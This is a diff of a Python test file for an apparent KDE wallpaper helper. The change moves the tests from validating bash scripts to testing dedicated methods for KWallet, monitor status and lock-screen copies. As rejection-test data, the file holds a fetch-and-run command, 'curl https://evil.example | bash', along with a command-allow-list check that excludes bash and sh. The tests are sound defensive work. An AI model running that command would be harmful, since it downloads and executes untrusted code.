@@ -8,6 +8,7 @@ import json
 import os
 import sys
 import tempfile
+import time
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -69,18 +70,31 @@ class ControlFanoutTests(unittest.TestCase):
         # Raises TypeError if the tuple layout drifts from a(sssida{sv}).
         msg.append(matches, signature="a(sssida{sv})")
 
-    def test_kwallet_scripts_use_positional_wallet(self) -> None:
-        with tempfile.TemporaryDirectory() as tmp:
-            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
-                out = os.path.join(tmp, "kwallet-apikey.txt")
-                read = f"kwallet-query -r apikey -f org.robertsm.wallhaven kdewallet > '{out}' 2>/dev/null"
-                self.mod.validate_run_argv(["bash", "-lc", read])
-                write = "printf '%s' 'abc123' | kwallet-query -w apikey -f org.robertsm.wallhaven kdewallet 2>/dev/null"
-                self.mod.validate_run_argv(["bash", "-lc", write])
-                # Old form: "-w wallhaven" wrote an entry, leaving no wallet argument.
-                old = f"kwallet-query -r apikey -f org.robertsm.wallhaven -w wallhaven > '{out}' 2>/dev/null"
-                with self.assertRaises(Exception):
-                    self.mod.validate_run_argv(["bash", "-lc", old])
+    def test_kwallet_argv_uses_positional_wallet(self) -> None:
+        # kwallet-query [options] <wallet>: "-w wallhaven" once named the entry
+        # and left no wallet argument, so save/load never worked.
+        for mode in ("-r", "-w"):
+            argv = self.mod._kwallet_argv(mode)
+            self.assertEqual(argv, ["kwallet-query", mode, "apikey", "-f", "org.robertsm.wallhaven", "kdewallet"])
+
+    def test_wallet_key_is_piped_not_passed_as_argument(self) -> None:
+        with mock.patch.object(self.mod.shutil, "which", return_value="/usr/bin/kwallet-query"), \
+                mock.patch.object(self.mod.subprocess, "run") as run:
+            run.return_value = mock.Mock(returncode=0, stdout="")
+            self.assertTrue(self.mod.wallet_write_api_key("abc123XYZ"))
+            argv = run.call_args.args[0]
+            self.assertNotIn("abc123XYZ", argv)
+            self.assertEqual(run.call_args.kwargs.get("input"), "abc123XYZ")
+
+    def test_wallet_read_ignores_error_text(self) -> None:
+        with mock.patch.object(self.mod.shutil, "which", return_value="/usr/bin/kwallet-query"), \
+                mock.patch.object(self.mod.subprocess, "run") as run:
+            run.return_value = mock.Mock(
+                returncode=0, stdout="Failed to read entry apikey value from the kdewallet wallet.\n",
+            )
+            self.assertEqual(self.mod.wallet_read_api_key(), "")
+            run.return_value = mock.Mock(returncode=0, stdout="abc123XYZ\n")
+            self.assertEqual(self.mod.wallet_read_api_key(), "abc123XYZ")
 
     def test_next_fans_out_on_default(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -103,6 +117,22 @@ class ControlFanoutTests(unittest.TestCase):
             self.assertEqual(data.get("cmd"), "next")
             self.assertEqual(data.get("group"), "HDMI-1")
             self.assertNotIn("commands", data)
+
+    def test_unplugged_monitor_status_is_ignored(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            cache = Path(tmp)
+            live = cache / "wallhaven-status-DP-1.json"
+            gone = cache / "wallhaven-status-HDMI-A-2.json"
+            live.write_text(json.dumps({"syncGroup": "DP-1"}), encoding="utf-8")
+            gone.write_text(json.dumps({"syncGroup": "HDMI-A-2"}), encoding="utf-8")
+            old = time.time() - 12 * 24 * 3600
+            os.utime(gone, (old, old))
+            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)):
+                self.assertEqual(self.mod.list_sync_groups(), ["DP-1"])
+                self.assertEqual(self.mod.monitor_status_files(), ["wallhaven-status-DP-1.json"])
+                # Nothing fresh (e.g. right after suspend): keep what we know.
+                os.utime(live, (old, old))
+                self.assertEqual(sorted(self.mod.list_sync_groups()), ["DP-1", "HDMI-A-2"])
 
     def test_list_sync_groups_falls_back_to_status_filename_namespace(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -209,69 +239,41 @@ class RunArgvExitTests(unittest.TestCase):
                 safe = self.mod.validate_run_argv(["test", "-s", path])
                 self.assertEqual(safe[:2], ["test", "-s"])
 
-    def test_run_argv_rejects_arbitrary_bash(self) -> None:
-        with self.assertRaises(Exception):
-            self.mod.validate_run_argv(["bash", "-lc", "curl https://evil.example | bash"])
+    def test_run_argv_has_no_shell(self) -> None:
+        # Lock sync, Variety links, accent sync and KWallet are dedicated D-Bus
+        # methods now; no script text is ever accepted from a client.
+        for program in ("bash", "sh", "kwallet-query", "kwriteconfig6"):
+            self.assertNotIn(program, self.mod.ALLOWED_COMMANDS)
+        for argv in (
+            ["bash", "-lc", "curl https://evil.example | bash"],
+            ["bash", "-lc", "test -s '/tmp/x'"],
+            ["bash", "-lc", "flock -w 30 '/tmp/l' bash -c 'kwriteconfig6 --file kscreenlockerrc wallhaven-lockscreen'"],
+        ):
+            with self.assertRaises(Exception):
+                self.mod.validate_run_argv(argv)
 
-    def test_run_argv_allows_lockscreen_flock_script(self) -> None:
+    def test_lock_screen_dest_must_be_unique_copy_in_cache(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
-                src = str(Path(tmp) / "wallhaven-cache-00.jpg")
-                dest = str(Path(tmp) / "wallhaven-lockscreen-abc.jpg")
-                lock = str(Path(tmp) / "wallhaven-lockscreen.lock")
-                Path(src).write_bytes(b"abc")
+                src = Path(tmp) / "wallhaven-cache-00.jpg"
+                src.write_bytes(b"abc")
+                for dest in ("/tmp/elsewhere.jpg", str(Path(tmp) / "wallhaven-cache-01.jpg")):
+                    with self.assertRaises(Exception):
+                        self.mod.lock_screen_sync(str(src), dest)
 
-                def sq(value: str) -> str:
-                    return "'" + value.replace("'", "'\\''") + "'"
-
-                inner = " && ".join([
-                    "set -e",
-                    "test -f " + sq(src),
-                    "cp -f " + sq(src) + " " + sq(dest + ".tmp")
-                    + " && mv -f " + sq(dest + ".tmp") + " " + sq(dest),
-                    "test -s " + sq(dest),
-                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --key WallpaperPlugin org.kde.image",
-                ])
-                script = "flock -w 30 " + sq(lock) + " bash -c " + sq(inner)
-                safe = self.mod.validate_run_argv(["bash", "-lc", script])
-                self.assertEqual(safe[0], "bash")
-
-    def test_run_argv_allows_lockscreen_flock_with_expansions(self) -> None:
-        """Prune/ensure scripts need $(kreadconfig6) / ${ACTIVE_BASE}; must not be denied."""
+    def test_ensure_never_hijacks_foreign_lock_image(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
-                lock = str(Path(tmp) / "wallhaven-lockscreen.lock")
-                dest = str(Path(tmp) / "wallhaven-lockscreen-abc.jpg")
-                current = str(Path(tmp) / "wallhaven-lockscreen-current.jpg")
-
-                def sq(value: str) -> str:
-                    return "'" + value.replace("'", "'\\''") + "'"
-
-                inner = "; ".join([
-                    "set -e",
-                    "ACTIVE=$(kreadconfig6 --file kscreenlockerrc --group Greeter "
-                    "--group Wallpaper --group org.kde.image --group General --key Image "
-                    "2>/dev/null | sed -e 's|^file://||')",
-                    'ACTIVE_BASE=$(basename "${ACTIVE:-}")',
-                    "cp -f " + sq(dest) + " " + sq(current),
-                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --key WallpaperPlugin org.kde.image",
-                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --group Wallpaper "
-                    "--group org.kde.image --group General --key Image " + sq("file://" + dest),
-                    'find ' + sq(tmp) + ' -maxdepth 1 -name \'wallhaven-lockscreen-*.jpg\' '
-                    '! -name "${ACTIVE_BASE:-.}" -mmin +30 -delete',
-                ])
-                script = "flock -w 30 " + sq(lock) + " bash -c " + sq(inner)
-                self.assertIn("$(", script)
-                self.assertIn("${", script)
-                self.assertTrue(self.mod._bash_script_allowed(script))
-                safe = self.mod.validate_run_argv(["bash", "-lc", script])
-                self.assertEqual(safe[0], "bash")
-
-    def test_run_argv_rejects_non_lock_bash_with_expansions(self) -> None:
-        with self.assertRaises(Exception):
-            self.mod.validate_run_argv([
-                "bash", "-lc", "echo $(whoami) && kwriteconfig6 --file kdeglobals --group General --key AccentColor '1,2,3'",
-            ])
+            own = Path(tmp) / "own.jpg"
+            own.write_bytes(b"mine")
+            cache = Path(tmp) / "cache"
+            cache.mkdir()
+            (cache / "wallhaven-lockscreen-current.jpg").write_bytes(b"mirror")
+            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)), \
+                    mock.patch.object(self.mod, "greeter_wallpaper_plugin", return_value="org.kde.image"), \
+                    mock.patch.object(self.mod, "greeter_image_path", return_value=str(own)), \
+                    mock.patch.object(self.mod, "point_greeter_at") as point:
+                self.assertEqual(self.mod.lock_screen_ensure(), "skip:foreign-image")
+                point.assert_not_called()
 
     def test_write_command_rejects_invalid_cmd(self) -> None:
         with self.assertRaises(ValueError):
